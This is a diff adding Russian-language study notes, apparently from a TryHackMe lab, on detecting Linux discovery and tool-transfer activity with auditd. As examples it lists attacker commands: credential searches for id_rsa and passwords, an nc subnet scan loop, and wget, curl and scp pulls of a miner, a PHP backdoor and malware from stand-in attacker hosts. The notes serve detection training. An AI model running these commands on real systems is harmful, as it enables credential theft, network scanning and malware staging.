@@ -95,3 +95,84 @@ output type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -
 Все методы Initial Access могут быть обнаружены через анализ дерева процессов
 
 ![[Pasted image 20260610222200.png]]
+
+# Discovery
+Обычно Ботнет сначала дает доступ к линукс машине а уже потом подключается злоумышленник.
+![[Pasted image 20260611120537.png]]
+
+## First Actions
+Обычно первые команды которые запускают атакующие очень похожи
+
+| Цель разведки                   | Типичные команды                                                       |
+| ------------------------------- | ---------------------------------------------------------------------- |
+| OS и File System разведка       | `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`         |
+| Разведка пользователей и групп  | `id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`     |
+| Процессы и сеть                 | `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp` |
+| Разведка в песочнице и в облаке | `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`   |
+## Обнаружение разведки
+### Специальная разведка
+После первичной разведки злоумышленники фокусируются на командах для достижения их целей: Стиллеры ищут пароли и секреты, криптомайнеры используют CPU и GPU информацию для обеспечения майнинга и ботнет скрипты сканируют сеть на наличие новых жертв. 
+
+| Цели Атаки                                                          | Типичные команды                                                       |
+| ------------------------------------------------------------------- | ---------------------------------------------------------------------- |
+| Найти и украсть учетные данные или другую чувствительную информацию | `history \| grep pass`, `find / -name .env`, `find /home -name id_rsa` |
+| Понять на сколько система подходит для криптомайнинга               | `cat /proc/cpuinfo`, `lscpu \| grep Model`, `free -m`, `top`, `htop`   |
+| Сканирование внутренней сети для других уязвимых                    | `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done`    |
+### Обнаружение разведки
+Обнаружить команды для разведки легко с помощью. auditd или других инструментов мониторинга во время выполнения. Первое это настройка auditd для логирования правильных команд. ![[Pasted image 20260611121950.png]]
+
+Очень важно так же понимать контекст для команд разведки. Например очень странно если веб сервер неожиданно начал выполнять `whoami` или один из IT коллег начал искать секреты с помощью find или grep. Но с другой стороны от инструмента мониторинга сети ожидается переодический PING для проверки локальной сети. Вы можете получить больше контекста построив дерево процессов
+```shell
+ubuntu@thm-vm:~$ ausearch -i -x whoami # Look for a Discovery command like whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
+type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami 
+
+ubuntu@thm-vm:~$ ausearch -i --pid 3898 # Identify its parent process, a lp.sh script 
+type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/bash /tmp/lp.sh 
+type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash 
+
+ubuntu@thm-vm:~$ ausearch -i --ppid 3898 # Look for other processes created by the lp.sh [Five more commands like "find /home -name *secret*" confirming the script is malicious ]
+```
+# Ingress tool transfer 
+Наиболее распространенные методы скачать дополнительные тулзы на машину жертвы: 
+
+| Команда                                 | Пример использования                                            |
+| --------------------------------------- | --------------------------------------------------------------- |
+| Wget - скачать файл с сайта             | wget https://github/[...]/something.tar.gz -O /tmp/miner.tar.gz |
+| Curl - сделать запрос к сайту           | curl --output /var/www/html/backdoor.php "https://backdor"      |
+| SSH -  передать файл через SCP или SFTP | scp kali@c2server:/home/kali/cve.sh /tmp/cve/cve.sh             |
+Как и другие creation events команды также могут сохраняться в auditd и иногда в Bash_history. однако существует случай когда логи бесполезны. Если жертва доступна по SSH, злоумышленник может запустить scp или sfrp со своей системы. В этом случае вы не увидите команду в журналах auditd но увидите новый вход ssh, тот же принцип применим и к другим службам передачи файлов, таких как FTP или SMB.
+
+Атакующий подключается к жертве:
+
+```shell
+attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp  
+[OK] Connecting to thm-vm machine via SSH...  
+[OK] Logged in on thm-vm via SSH as "ubuntu" [OK] File transferred from attack-vm to thm-vm  
+[OK] Job is done, logging out from thm-vm  
+  
+# To detect on victim, look for SSH logins in /var/log/auth.log
+```
+
+Жертва подключается к атакующему:
+
+```shell
+ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp 
+[OK] Connecting to attack-vm machine via SSH...  
+[OK] Logged in on attack-vm via SSH as "attacker" [OK] File transferred from attack-vm to thm-vm  
+[OK] Job is done, logging out from attack-vm  
+  
+# To detect on victim, look for "scp" command in Auditd logs
+```
+
+## Дополнительные правила обнаружения
+### Network Traffic
+- Скачивание с IP который был замечен в кибер атаках
+- Скачивание с подозрительных или известных опасных доменов
+- Скачивание с публичного сервиса известных инструментов для атаки
+### File Events
+- Недавно созданный файл во временных хранилищах, таких как `/tmp` или `/vat/tmp`
+- Недавно созданный файл названный: `exploit`, `shell.php` или `ghdfkjgs`
+### Предупреждения от антивируса
+- EDR или антивирус создает предупреждение о новом подозрительном процессе или файле
+
